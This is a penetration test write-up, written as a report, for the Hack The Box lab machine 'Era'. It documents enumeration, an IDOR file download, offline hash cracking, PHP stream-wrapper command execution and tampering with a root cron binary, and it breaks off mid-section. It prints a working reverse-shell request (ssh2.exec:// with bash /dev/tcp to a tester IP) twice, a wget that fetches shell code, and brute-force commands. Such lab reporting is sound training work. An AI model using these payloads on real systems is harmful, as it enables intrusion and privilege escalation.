# Penetration Test Report — HTB Era (CWES Practice)

| Field                  | Details                       |
| ---------------------- | ----------------------------- |
| Assessment Type        | Internal Penetration Testing  |
| Target                 | Era — Part of the CWES Track  |
| Target IP              | HTB lab address (session-specific) |
| Operating System       | Linux                         |
| Difficulty             | Medium                        |
| Assessment Date        | 19/10/2026 (assessment recorded; evidence captured 20/10/2026) |
| Assessment Environment | Hack The Box — Authorised Lab |
| Author                 | matw0                         |

---
## Executive Summary

This report covers an authorised penetration test against **Era**, a medium-difficulty Linux machine on Hack The Box. My objective was to enumerate the exposed services, investigate the web application for weaknesses and determine whether those weaknesses could be used to gain access to the host.

I began with Nmap and discovered FTP and HTTP services. The website redirected to `era.htb`, and further virtual-host enumeration revealed `file.era.htb`, which contained file-management features and an alternative login using security questions. Testing these functions showed that the application exposed whether usernames existed and, according to the recorded assessment steps, allowed security-question answers to be changed without properly verifying account ownership.

I then investigated the file download feature. Predictable file identifiers led to the retrieval of application archives, including a SQLite database backup and signing-related files. The backup exposed user records and password hashes, which I tested offline and used to recover credentials in the lab. Reviewing the PHP source code also revealed that an administrative file-preview feature accepted a user-controlled PHP stream wrapper. By combining this behaviour with recovered credentials, I obtained an interactive shell as the Linux user `eric`.

Finally, local enumeration revealed a monitoring executable called by a root-owned scheduled task. The executable could be modified from the compromised user session, but my first attempt was **rejected by a signature check**. A later screenshot confirms root access; however, the intermediate steps leading from the failed replacement to the root shell were not preserved. I have kept that limitation clear rather than presenting the missing step as a proven method.

The assessment documents **five security findings**, with some scores and claims requiring a final evidence check: username enumeration, unauthorised security-question changes, insecure file downloads, unsafe PHP stream-wrapper handling and weak permissions around a privileged scheduled task. The main risk is how these weaknesses can be chained together: information disclosure supports credential recovery, which can then contribute to host compromise.

**Priority:** Fix the unauthorised account-recovery changes, restrict access to other users' files, remove unsafe wrapper handling, and prevent low-privileged users from modifying anything executed by root. Some evidence is incomplete, as noted in the relevant findings.

---

## 1. Assessment Overview

**Scope:** The HTB Era lab machine and the application reachable through `era.htb` and `file.era.htb`. All activity was carried out in the authorised training environment.

**Approach:** Service enumeration with Nmap; virtual-host and directory fuzzing with `ffuf`; manual web testing using Burp Suite and OWASP ZAP; application/database inspection; credential testing; and local Linux enumeration after gaining a shell.

**Reporting standard:** I have included observed requests, responses, commands and screenshots where available. A successful-looking scan result is not automatically treated as proof of exploitation, and missing steps are identified explicitly. Credentials, session tokens and HTB proof strings are omitted from the public version.

---

## 2. Evidence — Technical Walkthrough

### 2.1 Initial Reconnaissance and Service Discovery

I began by scanning the target to identify the exposed services and their versions:

```bash
nmap -sV -sC -T4 -oA test1 10.129.237.233
```

```text
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
80/tcp open  http    nginx 1.18.0 (Ubuntu)

http-title: Did not follow redirect to http://era.htb/
```

**Observation:** The host exposed FTP and HTTP. The HTTP service redirected to `era.htb`, which indicated that the hostname was important for virtual-host routing. I added the hostname to my local `/etc/hosts` configuration before continuing.

I reviewed the public website and inspected its HTML. The page appeared primarily informational; the contact form was visible, but I did not observe a useful application request being submitted from it during interception.

![E01 — Public contact form on era.htb](./evidence/Pasted%20image%2020261020142601.png)

*Figure E01 — The public-facing contact form on `era.htb`. Its presence alone does not establish a vulnerability.*

### 2.2 Virtual Host and Directory Enumeration

While browsing, I used `ffuf` to look for other virtual hosts by modifying the HTTP `Host` header:

```bash
ffuf -u http://era.htb \
  -H "Host: FUZZ.era.htb" \
  -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt \
  -fs 154
```

```text
file [Status: 200, Size: 6765, Words: 2608, Lines: 234]
```

**Observation:** This revealed `file.era.htb`. I added that hostname to `/etc/hosts` and prioritised it because it exposed interactive file-management and authentication functionality.

I also tested directory enumeration on the original `era.htb` website. The relevant results were static asset directories:

```text
img    [Status: 301]
css    [Status: 301]
js     [Status: 301]
fonts  [Status: 301]
```

The scan was interrupted because it was returning large amounts of low-value output. These results did not establish an exploitable weakness on the original site.

![E02 — File-management application at file.era.htb](./evidence/Pasted%20image%2020261020143001.png)

*Figure E02 — `file.era.htb` offered Manage Files, Upload Files, Update Security Questions and Sign In, providing a more substantial attack surface.*

I then enumerated PHP endpoints on the file-management virtual host:

```bash
ffuf -u http://file.era.htb/FUZZ \
  -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt \
  -recursion-depth=4 -recursion-strategy=greedy \
  -fs 6765 -e .php,.html,.phtml
```

```text
login.php       [Status: 200]
register.php    [Status: 200]
logout.php      [Status: 200]
layout.php      [Status: 200]
download.php    [Status: 302]
upload.php      [Status: 302]
manage.php      [Status: 302]
reset.php       [Status: 302]
LICENSE         [Status: 200]
```

**Analysis:** The HTTP 302 responses for several functions suggested that unauthenticated requests were being redirected. I therefore focused on the sign-in flow, security-question login and account registration.

### 2.3 Login and Security-Question Testing

The application offered an alternative way to log in by answering three security questions.

![E03 — Intercepted POST request to security_login.php](./evidence/Pasted%20image%2020261020145221.png)

*Figure E03 — Burp Suite shows a `POST /security_login.php` request with a test username and three submitted answers. The response contains the message `User not found.`*

![E04 — Security-question login form](./evidence/Pasted%20image%2020261020145352.png)

*Figure E04 — The security-question login interface requests a username and answers to three account-recovery questions.*

I compared how the application responded to requests through this form and observed that the `POST` response disclosed whether a supplied username existed through a distinguishable error message. This was worth investigating for username enumeration.

I also tested the normal `login.php` endpoint.

![E05 — Generic sign-in failure message](./evidence/Pasted%20image%2020261020145540.png)

*Figure E05 — The regular sign-in page returned `Invalid username or password`. This generic message alone did not provide the same explicit username-not-found distinction.*

I attempted a SQL injection check against a saved login request:

```bash
sqlmap -r login1.req --level=5 --risk=3 --technique=B --dump --batch
```

```text
[WARNING] (custom) POST parameter '#1*' does not seem to be injectable
[CRITICAL] all tested parameters do not appear to be injectable
```

**Result:** No SQL injection was confirmed by this test. Because the test was restricted to a particular technique and request, it should not be described as proof that the application is entirely free from SQL injection.

### 2.4 Username Enumeration and Unsuccessful Credential Testing

I used OWASP ZAP's fuzzer to submit candidate usernames and compare responses for the security-question authentication flow.

![E06 — ZAP fuzzing results for candidate usernames](./evidence/Pasted%20image%2020261020151229.png)

*Figure E06 — ZAP shows the automated request/response testing environment used to compare authentication responses. The screenshot alone is not sufficient to establish which individual usernames were valid.*

![E07 — ZAP candidate username results](./evidence/Pasted%20image%2020261020154159.png)

*Figure E07 — The fuzzer result list includes candidate usernames such as `eric`, `veronica` and `yuri`. A response-level comparison is needed to document which were reliably distinguished from nonexistent accounts.*

I also tried a password wordlist against the standard sign-in endpoint:

```bash
ffuf -u http://file.era.htb/login.php \
  -X POST \
  -d 'submitted=true&username=john&password=FUZZ' \
  -w /usr/share/wordlists/rockyou.txt \
  -fs 9214
```

```text
maxim [Status: 200, Size: 0, Words: 1, Lines: 1]
```

**Result:** The output was not enough, by itself, to demonstrate a successful login. The zero-length response was an interesting deviation that would need a follow-up authenticated request or valid session to confirm its meaning.

I stopped further brute-force testing and returned to manual application enumeration. The fact that the database later contained bcrypt hashes does **not** mean the web login should have received hashed passwords: web logins commonly accept plaintext over the protected transport and compare it against a stored hash on the server.

### 2.5 Authenticated Application Access and Account-Recovery Functionality

I registered a test account and authenticated to access the application features that had previously redirected to login.

![E08 — Authenticated file-management and account settings page](./evidence/Pasted%20image%2020261020160204.png)

*Figure E08 — The Manage Files & Settings page provides file-management functionality and a Reset Security Questions option.*

During testing, I also used `reset.php` to change answers associated with usernames discovered during enumeration, according to my working notes.

**Evidence limitation:** The notes describe changing other users' security question answers and using this to log in, including attempting the administrator account. However, the recovered screenshots do not contain the exact `reset.php` request or its response. I tested this after registering a normal account, and the saved scan shows an unauthenticated redirect. A second test would be needed to establish whether the same issue can be exploited without signing in.

### 2.6 File Identifier Enumeration and Access to Archived Files

The file-management workflow used integer identifiers in requests to `download.php`. I tested whether other identifiers returned different responses.

```bash
ffuf -w <(seq 1 1000) \
  -u 'http://file.era.htb/download.php?id=FUZZ' \
  -b 'PHPSESSID=[REDACTED]' \
  -fw 3161
```

```text
54  [Status: 200, Size: 6378, Words: 2552, Lines: 222]
150 [Status: 200, Size: 6366, Words: 2552, Lines: 222]
```

**Observation:** The two responses were candidates for further inspection, rather than proof of unauthorised disclosure based on response size alone. My recorded testing subsequently retrieved files identified as `site-backup-30-08-24.zip` and `signing.zip`.

**Evidence note:** The original notes referenced an upload/download screenshot called `Pasted image 20261020162653.png`. That screenshot was not present in the recovered evidence ZIPs. The request output and downloaded archive details are preserved, but the screenshot of the original file ID is still missing.

### 2.7 Inspection of `signing.zip` and the SQLite Application Backup

The recovered `signing.zip` archive included a private key/certificate bundle and an `x509.genkey` configuration. I reviewed the configuration instead of reproducing the full private key in the report:

```ini
[ req ]
default_bits = 2048
distinguished_name = req_distinguished_name
x509_extensions = myexts

[ req_distinguished_name ]
O = Era Inc.
CN = ELF verification
emailAddress = yurivich@era.com

[ myexts ]
basicConstraints=critical,CA:FALSE
keyUsage=digitalSignature
```

**Observation:** This material was associated with ELF signing/verification. It may be relevant to the monitoring process investigated later. Its presence does not establish that this key was used for SSH authentication.

The other archive contained an application database called `filedb.sqlite`. I inspected it using the SQLite command-line client:

```bash
sqlite3 filedb.sqlite
```

```sql
.tables
SELECT * FROM users;
.schema
SELECT * FROM files;
```

Relevant results:

```text
Tables:
  files
  users

Usernames found:
  admin_ef01cab31aa
  eric
  veronica
  yuri
  john
  ethan

Password representations:
  $2y$10$...  (bcrypt)
  $2b$12$...  (bcrypt)
  $2a$10$...  (bcrypt)

Files table snapshot:
  54 | files/site-backup-30-08-24.zip | 1 | 1725044282
```

The schema confirmed that the `users` table contained a username, password hash, file-retention setting and three security-question answer fields. The `files` table recorded file identifiers, paths, owners and timestamps.

**Important distinction:** The backup database is a snapshot, while the earlier `ffuf` requests queried a live service. Therefore, a single row in this backup's `files` table does not disprove the separate live response for ID `150`, and it does not prove that no additional files existed on the server.

Offline hash analysis recovered credentials for two users in the laboratory:

```text
eric → [REDACTED]
yuri → [REDACTED]
```

This established that passwords could be recovered from the exposed hashes in this instance. It does not mean bcrypt itself was broken: recoverability depends on password choice and the resources and wordlist used.

### 2.8 Source-Code Review: Admin-Only File Preview and PHP Wrappers

I searched the extracted source code for references to administrative behaviour:

```bash
grep -rin "admin" *.php
```

```text
download.php:58: // BETA (Currently only available to the admin) - Showcase file instead of downloading it
functions.global.php:13: // example query for admin-owned files
upload.php:222: // administrators may change php.ini upload limits
```

Further inspection of `download.php` revealed an administrative file-preview function. The following extract is central to understanding the issue:

```php
} elseif ($_GET['show'] === "true" && $_SESSION['erauser'] === 1) {
    $format = isset($_GET['format']) ? $_GET['format'] : '';
    $file = $fetched[0];

    if (strpos($format, '://') !== false) {
        $wrapper = $format;
        header('Content-Type: application/octet-stream');
    } else {
        $wrapper = '';
        header('Content-Type: text/html');
    }

    try {
        $file_content = fopen($wrapper ? $wrapper . $file : $file, 'r');
        $full_path = $wrapper ? $wrapper . $file : $file;
        echo "Opening: " . $full_path . "\n";
        echo $file_content;
    } catch (Exception $e) {
        echo "Error reading file: " . $e->getMessage();
    }
}
```

**What this means:**

- `show=true` invokes the preview branch when the session corresponds to `erauser === 1`; the underlying access requirement is therefore a key part of the attack path.
- `$format` comes from the URL query string.
- The code checks whether the supplied value contains `://`, but it does not show an allowlist restricting which PHP stream wrappers are permitted.
- `fopen()` then receives a path built from the supplied wrapper and the stored file path.

PHP stream wrappers give filesystem functions a way to access resources through schemes such as `file://` and, if the relevant extension is installed, `ssh2.exec://`. In this case the risk is not the existence of wrappers by itself, but allowing user-influenced wrapper syntax to reach `fopen()`.

The recorded request in the next section demonstrates that this was more than a theoretical source-code concern.

### 2.9 FTP Enumeration and Availability of the SSH2 Extension

Using the recovered `yuri` credentials, I successfully authenticated to the FTP service identified by the initial Nmap scan:

```text
ftp era.htb
Name: yuri
Password: [REDACTED]
230 Login successful.
```

The FTP directory listing included PHP 8.1 extension files under `php8.1_conf/`, including:

```text
ssh2.so
```

**Observation:** The presence of `ssh2.so` was relevant because the source code used `fopen()` with a selectable wrapper. The listing alone does not prove the extension was loaded in the web process; the subsequent result provides the stronger behavioural evidence.

### 2.10 PHP Stream-Wrapper Execution and Initial Shell

My notes record a crafted request to the file-preview functionality, using the `ssh2.exec://` scheme with the recovered `eric` credentials and an authenticated web session.

```http
GET /download.php?id=54&show=true&format=ssh2.exec://eric:[REDACTED]@localhost:22/bash+-c+"bash+-i+>%26+/dev/tcp/10.10.15.197/4445+0>%261"%23 HTTP/1.1
Host: file.era.htb
Cookie: PHPSESSID=[REDACTED]
```

**Analysis:** The `ssh2.exec://` stream-wrapper syntax represents an SSH-backed command execution operation rather than an ordinary file-format selector. Here, the application combined attacker-influenced wrapper input with a file-reading function. The recorded request leveraged credentials recovered earlier in the assessment. The trailing encoded `#` was part of the tested URI string; its precise effect on the appended file path should be explained from the resulting request behaviour rather than assumed.

A listener on the testing machine received a connection:

```text
listening on [any] 4445 ...
connect to [10.10.15.197] from (UNKNOWN) [10.129.237.233] ...
eric@era:~$
```

Local enumeration showed the shell was operating as `eric`. The user-level HTB proof file was also accessed, but its contents are intentionally excluded from the public report.

**Result:** An interactive shell as `eric` was obtained. This is the confirmed initial host foothold shown by the supplied terminal output.

### 2.11 Local Enumeration: Root Cron Job and Monitoring Binary

After obtaining the user shell, I investigated recurring processes to identify services executing with higher privileges. The process-monitoring output contained repeated root-owned cron executions:

```text
UID=0 | /usr/sbin/CRON -f -P
UID=0 | bash -c /root/initiate_monitoring.sh
UID=0 | /opt/AV/periodic-checks/monitor
UID=0 | openssl asn1parse -inform DER -in text_sig_section.bin
```

**Observation:** The root-run script periodically interacted with a custom monitoring executable and appeared to inspect signed binary content. This made the monitoring directory a relevant place to investigate.

The directory permissions were:

```text
eric@era:/opt/AV/periodic-checks$ ls -la

drwxrwxr-- 2 root devs  4096 ... .
-rwxrw---- 1 root devs 16544 ... monitor
-rw-rw---- 1 root devs   307 ... status.log
```

The `monitor` file was writable by its owner and group, and the later `cp` command in my notes succeeded. The evidence therefore supports that this session could modify the monitoring executable; the specific group-membership check (for example, output of `id`) was not included.

### 2.12 Monitoring Binary Replacement: First Attempt and Final Result

I transferred a small C source file to the machine, compiled it and copied the resulting executable over the monitored binary:

```bash
wget http://10.10.15.197:85/shell.c
gcc shell.c -o shell
cp shell monitor
cat status.log
```

The log recorded an unsuccessful integrity check:

```text
objcopy: /opt/AV/periodic-checks/monitor: can't dump section '.text_sig'
[ERROR] Executable not signed. Tampering attempt detected. Skipping.
```

**Result of this attempt:** The root-owned monitoring workflow rejected the substituted executable because the expected `.text_sig` section was not present or could not be extracted. This failed test is important evidence: simply replacing `monitor` was not sufficient.

![E09 — Later shell running as root](./evidence/Pasted%20image%2020261020184653.png)

*Figure E09 — A later terminal screenshot shows a shell prompt as `root@era` and access to root-protected content. The HTB proof value is not reproduced in the report text.*

**Evidence gap:** My notes jump from the failed signature validation to a later root shell. They do not include the steps that satisfied or bypassed the executable-signature check. The root screenshot confirms the final access level, but I have not described the missing method as if it were proven.

---
## 3. Vulnerability Findings

*Scores marked with an asterisk are provisional because one or more prerequisites or ownership checks were not preserved in the evidence.*

| ID  | Finding                                                | Severity | CVSS v3.1 | CWE                                             |
| --- | ------------------------------------------------------ | -------- | --------- | ----------------------------------------------- |
| F01 | Username Enumeration via Authentication Responses      | Medium   | 5.3       | https://cwe.mitre.org/data/definitions/204.html |
| F02 | Improper Authorisation in Security Question Management | High*    | 8.2*      | https://cwe.mitre.org/data/definitions/639.html |
| F03 | Insecure Direct Object Reference in File Downloads     | Medium*  | 6.5*      | https://cwe.mitre.org/data/definitions/284.html |
| F04 | Unsafe PHP Stream Wrapper Handling                     | High*    | 7.1*      | https://cwe.mitre.org/data/definitions/94.html  |
| F05 | Privilege Escalation via Privileged Scheduled Task     | High*    | 7.1*      | https://cwe.mitre.org/data/definitions/732.html |

---
### F01 - Username Enumeration Via Authentication Responses

**Severity:** Medium
**CVSS:** 5.3
**Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N`

#### Vulnerability Clarification/Scope

| Field                         | Value                                                                                    |
| ----------------------------- | ---------------------------------------------------------------------------------------- |
| Vulnerability Title           | Username Enumeration via Authentication Reponses                                         |
| Vulnerability Class           | Information Disclosure — Username Enumeration                                            |
| CWE                           | https://cwe.mitre.org/data/definitions/204.html                                          |
| CVE                           | N/A (unless applicable)                                                                  |
| OWASP Mapping                 | OWASP Automated Threat: OAT-007 — Credential Cracking (related technique)                |
| Severity                      | Medium                                                                                   |
| CVSS v3.1 Base Score          | 5.3                                                                                      |
| CVSS v3.1 Vector              | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N                                             |
| Affected Asset                | `file.era.htb`                                                                           |
| Affected Component / Endpoint | `/security_login.php`                                                                    |
| Affected Parameter / Resource | `username`                                                                               |
| Authentication Required       | No - Unauthenticated                                                                     |
| Preconditions                 | N/A                                                                                      |
| Security Boundary Crossed     | Enumeration of users using wordlist through application responses without authentication |
| Finding Status                | Confirmed                                                                                |
#### Description:
An unauthenticated user is able to enumerate users through the response given after providing a username and incorrect answers to the security questions within the `/security_login.php` page. The page prompts either 'User does not exist' if username doesn't exist or 'Incorrect answers', which is the giveaway to the attacker and what gives the ability to enumerate users.
If the attacker provides incorrect answers but a 'correct' user, they will be told that the username they provided does exist within this system, but the answers need to be correct, hence being able to identify easily which user is valid.


#### Evidence / POC
*Used Burp Suite to demonstrate how the request looks when an invalid username is provided*
![E03 — Intercepted security-question login request](./evidence/Pasted%20image%2020261020145221.png)
*Below are the enumeration results that are different compared to the previous processed responses*
![E07 — ZAP username enumeration results](./evidence/Pasted%20image%2020261020154159.png)

#### Reproduction Summary
The targeted endpoint of this vulnerability lies in the `/security_login.php` page, once a request has been caught to this endpoint, the parameters that are unmodified are the security questions and the only parameter that is being tested is the usernames paramter. Next modify the parameter of the username with only one payload in this section, and that is a usernames file. Tools to assist replicating this attack could be Burp/OWASP ZAP. Once the payload has been applied and the fuzzing has begun, attacker should wait to see differences in responses from certain usernames, such as filtering for different response length, which has a different message of "Incorrect answers" rather than showing "User does not Exist", indicating account existence.
#### CVSS Rationale
`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N` - The vulnerability can be exploited remotely through the `/security_login.php` endpoint without authentication and user interaction. By submitting usernames with incorrect security question answers, an unauthenticated attacker can differenciate valid accounts from nonexistent ones through different application responses.

The confidentiality impact is assessed as low because the application discloses valid account identifiers that aren't publicly listed. However, the exploit does not directly expose passwords or grant access to accounts. Integrity and Availability remain unaffected because the vulnerability does not permit the modification of application data nor cause service disruption. The scope remains Unchanged because the demonstrated impact is limited to information disclosed by the affected application through enumeration.

#### Impact
Unauthenticated users are capable of differentiating existing usernames from nonexistent ones and account existence. As a result the attacker could focus on either social engineering, potentially password guessing or credential stuffing to obtain account access. The vulnerability exposes valid account identifiers reflecting low confidentiality, but does not grant access to users accounts, yet could still assist an attacker in conducting further attacks.

#### Remediation
Developers should consider changing the response to both conditions, when account username is valid and security question answers are incorrect, to a response that is indistinguishable, an ideal response example that does not disclose any information is "Unable to verify account details" as it doesn't state whether the username is valid or the answers to the questions are incorrect.
Another measure related to analyzing differences in responses is consistency in status codes and processing times. Both conditions should return identical observable responses preventing enumeration through alternative response discrepancies.
Another security measure that could take place is rate limiting, in order to restrict how many requests can be made, reducing the effectiveness of automating username enumeration through requests using wordlists and slowing the procedure. 

---
### F02 - Security Question Management

**Severity:** High
**CVSS:** 8.2 (provisional pending unauthenticated retest)
**Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:H/A:N`

#### Vulnerability Classification/Scope

| Field                         | Value                                                                                               |
| ----------------------------- | --------------------------------------------------------------------------------------------------- |
| Vulnerability Title           | Improper Authorisation in Security Question Management                                              |
| Vulnerability Class           | Broken Authentication or Broken Access Control                                                      |
| CWE                           | https://cwe.mitre.org/data/definitions/639.html                                                     |
| CVE                           | N/A (unless applicable)                                                                             |
| OWASP Mapping                 | OWASP Automated Threat: OAT-007 — Credential Cracking (related technique)                           |
| Severity                      | High                                                                                                |
| CVSS v3.1 Base Score          | 8.2                                                                                                 |
| CVSS v3.1 Vector              | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:H/A:N                                                        |
| Affected Asset                | `file.era.htb`                                                                                      |
| Affected Component / Endpoint | `/reset.php`                                                                                        |
| Affected Parameter / Resource | All security question answer parameters                                                             |
| Authentication Required       | Not independently verified. The saved walkthrough shows testing after a test-account login.        |
| Preconditions                 | N/A                                                                                                 |
| Security Boundary Crossed     | Ability to change security question answers of any user without having to be logged in as that user |
| Finding Status                | Reported in working notes; supporting reset request/response not preserved                          |
#### Description
During my testing, I could change other users' security question answers by entering their usernames and my own answers. My notes document this after logging in with a test account, so I cannot confirm from the saved evidence whether `/reset.php` also permits completely unauthenticated requests. Within this `/reset.php` page, once the username and answers are entered, attacker can verify that the answers were in fact modified in the `/security_login.php`, by providing previous input answers. No username enumeration can occur within the `/reset.php` page as it did in the `/security_login.php` page, as the attacker still gets prompted that answers have been changed even if the username isn't valid.

#### Evidence/PoC

*Shows the `/security_login.php` page and what attacker can do after exploiting this vulnerability*
![E04 — Security-question login form](./evidence/Pasted%20image%2020261020145352.png)

#### Reproduction Summary
Start with the `/reset.php` page using a valid test session, as done during my assessment. After entering any previously enumerated user, submit new values in the security question fields. Once entered and submitted, attacker will be presented with a notification above the fields, stating that `Answer reset was successful!`. Returning back to `/security_login.php`, attacker can submit newly modified answers for the specified username and should be logged in as that user.

#### CVSS Rationale
`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:H/A:N` - This is the score from my original assessment and assumes no authentication is required. The earlier endpoint scan returned a redirect for unauthenticated access, so this needs checking before treating the 8.2 score as final. The scope remains unchanged but integrity becomes high, attacker is able to change administrator's security question answers and login as well as other users, confidentiality however remains low as only non-public account information is exposed, furthermore previous security question answers aren't stored/can't be viewed as there is no history available. 
Availability is also none as there is no disruption given that passwords aren't changed despite preventing users from logging in through their security question in a case where they forget their password, users can still log in through their password and modify their security questions again.

#### Impact
Allows attacker to be able to sign in as any user after modifying their security question answers, and signing in as that user without knowing their password. This therefore compromises the integrity of the account recovery system, and exposes information and available operations that account can perform.
If a higher privileged account is targeted, the attacker may also gain access to operations that can only be performed by the administrator, hence increasing the severity of the account compromise. This demonstrated impact is account takeover and any further exploitation depends on what privileges the administrator account has.

#### Remediation
Developers should implement identity verification and server-side authorisation checks in the `/reset.php` endpoint, in order to ensure that only the legitimate account owner can modify their security question answers. This could involve requiring the user's existing password or a one-time verification code sent to their registered email address or mobile number.

Any verification token should be short lived and single-use with the account being recovered. The application must verify account ownership before allowing changes to security question answers, rather than relying on a username supplied in the request.

Developers should also review the `/security_login.php` endpoint to ensure that its authentication process cannot be bypassed, as the security questions should not be relied upon as the sole authentication mechanism, particularly where they directly grant account access to the attacker.

Further guidance can be found in the [NCSC's authentication recommendations](https://www.ncsc.gov.uk/guidance/authentication-methods-choosing-the-right-type) and the [OWASP Forgot Password Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Forgot_Password_Cheat_Sheet.html).

---
### F03 - IDOR in File Downloads

**Severity:** Medium  
**CVSS:** 6.5  
**Vector:** `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N`

#### Vulnerability Classification/Scope

| Field | Value |
| --- | --- |
| Vulnerability Title | Insecure Direct Object Reference in File Downloads |
| Vulnerability Class | Broken Access Control — IDOR |
| CWE | [CWE-639 — Authorization Bypass Through User-Controlled Key](https://cwe.mitre.org/data/definitions/639.html) |
| CVE | N/A — HTB lab finding |
| OWASP Mapping | A01:2021 — Broken Access Control |
| Severity | Medium |
| CVSS v3.1 Base Score | 6.5 |
| CVSS v3.1 Vector | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N` |
| Affected Asset | `file.era.htb` |
| Affected Component / Endpoint | `/download.php` |
| Affected Parameter / Resource | `id` — numeric file identifier |
| Authentication Required | Yes — authenticated application session |
| Security Boundary Crossed | Access to file records outside the requesting user's own files |
| Finding Status | Archives recovered during testing; full ownership comparison not preserved |

#### Description

The file-management application uses a numeric `id` parameter to decide which file is downloaded. During testing, I noticed that it was possible to change this identifier manually instead of selecting files through the interface. This is a potential IDOR vulnerability because the application should make sure that the requested file actually belongs to the user who is logged in.

I used `ffuf` to test different values for the `id` parameter while supplying an authenticated session cookie. The responses for IDs `54` and `150` stood out and were investigated further. My recorded testing led to the retrieval of `site-backup-30-08-24.zip` and `signing.zip`. One archive contained the application's SQLite database, while the other included signing material.

This is more serious than simply being able to guess file identifiers. The recovered backup exposed usernames, password hashes and parts of the application. That information was later useful when continuing the assessment. However, the full HTTP download responses and a side-by-side comparison of the requesting account against each file's owner were not saved, which limits how independently the IDOR can be verified from these notes.

#### Evidence / PoC

I tested sequential file identifiers with an existing authenticated session:

```bash
ffuf -w <(seq 1 1000) \
  -u 'http://file.era.htb/download.php?id=FUZZ' \
  -b 'PHPSESSID=[REDACTED]' \
  -fw 3161
```

The responses that stood out were:

```text
54  [Status: 200, Size: 6378, Words: 2552, Lines: 222]
150 [Status: 200, Size: 6366, Words: 2552, Lines: 222]
```

The extracted `filedb.sqlite` backup showed the application kept a `files` table containing file IDs, paths and an owner reference. A saved row included:

```text
54 | files/site-backup-30-08-24.zip | 1 | 1725044282
```

**Evidence note:** The response-size differences alone are not proof of IDOR. The important observation is that the file IDs could be tested and the recorded investigation subsequently recovered archives containing information that was not intended to be public.

#### Reproduction Summary

1. Register a test account and log in to `file.era.htb`.
2. Intercept a request to `download.php` and identify the numeric `id` parameter.
3. Replace the identifier with other file IDs while keeping the same authenticated session.
4. Compare the returned responses and inspect any file that is actually downloaded.
5. Confirm the ownership of each returned file against the requesting account. This final comparison should be captured in any repeat assessment to prove cross-user access conclusively.

#### CVSS Rationale

`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N` — The issue can be tested remotely through the application, but requires a valid user session. The attack does not require another user to interact with the request. Confidentiality is assessed as high because the recorded downloads exposed a database backup containing user records and password hashes, along with signing-related material. Integrity and availability are not directly affected by the file download operation.

This severity assumes that the retrieved files were outside the account's authorised access, as suggested by the working notes. The missing ownership comparison should be added if the finding is reused for a formal client assessment.

#### Impact

An attacker with a normal user account could potentially access files belonging to other users by changing their identifiers. In this assessment, the recovered archives contained sensitive application information. The database backup also provided password hashes that could be attacked offline, which contributed to the later exploitation chain.

The main concern is therefore **information disclosure that makes further attacks easier**, rather than modification or deletion of files through this endpoint.

#### Remediation

Developers should implement server-side authorisation checks on every file download request. The application should check that the file ID belongs to the logged-in account before allowing the download. It should not trust the numeric identifier simply because a user has an active session.

File lookups should be restricted by both the requested ID and the authenticated user's ownership or permitted access. If access is denied, the application should return a consistent error and avoid revealing sensitive file details. Backups, signing keys and application databases should also be stored outside publicly reachable download directories, with unnecessary copies removed and exposed credentials rotated.

---

### F04 - Unsafe PHP Stream Wrapper Handling

**Severity:** High  
**CVSS:** 7.1  
**Vector:** `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N`

#### Vulnerability Classification/Scope

| Field | Value |
| --- | --- |
| Vulnerability Title | Unsafe PHP Stream Wrapper Handling in File Preview |
| Vulnerability Class | Improper Input Handling — Command Execution |
| CWE | [CWE-94 — Improper Control of Generation of Code](https://cwe.mitre.org/data/definitions/94.html) (classification retained from assessment notes) |
| CVE | N/A — HTB lab finding |
| OWASP Mapping | A03:2021 — Injection (related) |
| Severity | High |
| CVSS v3.1 Base Score | 7.1 (chain-dependent, see rationale) |
| CVSS v3.1 Vector | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N` |
| Affected Asset | `file.era.htb` and the underlying Linux host |
| Affected Component / Endpoint | `/download.php` — administrative preview branch |
| Affected Parameter / Resource | `show=true` and `format` |
| Authentication Required | Yes — a session satisfying the admin-only preview check |
| Preconditions | Access to the preview branch and valid SSH credentials used by the wrapper |
| Security Boundary Crossed | Web application file preview to operating-system command execution |
| Finding Status | Interactive shell confirmed; full session prerequisite not independently recorded |

#### Description

After recovering the application backup, I reviewed the PHP source code to understand what the file download function was doing. I came across an administrative file-preview option in `download.php`. The code accepted a `format` parameter from the URL and passed it into PHP's `fopen()` function if the value contained `://`.

The issue was that the application did not restrict that value to a safe list of file formats or stream wrappers. As a result, a supplied PHP wrapper could change how the application tried to open the file. This became important when I noticed the `ssh2.so` extension was present on the FTP service.

Using the `ssh2.exec://` wrapper together with credentials recovered earlier, my recorded request led to a reverse shell as `eric`. It is important to separate the different parts of the chain: the backup exposed credentials, while the unsafe file-preview function provided the behaviour used to execute the command. The signing certificate found in `signing.zip` was **not** used to authenticate the SSH connection.

#### Evidence / PoC

The relevant source-code check was:

```php
} elseif ($_GET['show'] === "true" && $_SESSION['erauser'] === 1) {
    $format = isset($_GET['format']) ? $_GET['format'] : '';
    // ...
    if (strpos($format, '://') !== false) {
        $wrapper = $format;
    }
    // ...
    $file_content = fopen($wrapper ? $wrapper . $file : $file, 'r');
}
```

The condition on `$_SESSION['erauser']` is important: this branch is intended for the administrative session, so the ability to reach it cannot be assumed for every normal account.

My recorded HTTP request used the following structure. The recovered credential and session cookie are redacted:

```http
GET /download.php?id=54&show=true&format=ssh2.exec://eric:[REDACTED]@localhost:22/bash+-c+"bash+-i+>%26+/dev/tcp/10.10.15.197/4445+0>%261"%23 HTTP/1.1
Host: file.era.htb
Cookie: PHPSESSID=[REDACTED]
```

The listener on my Kali machine received a connection and showed:

```text
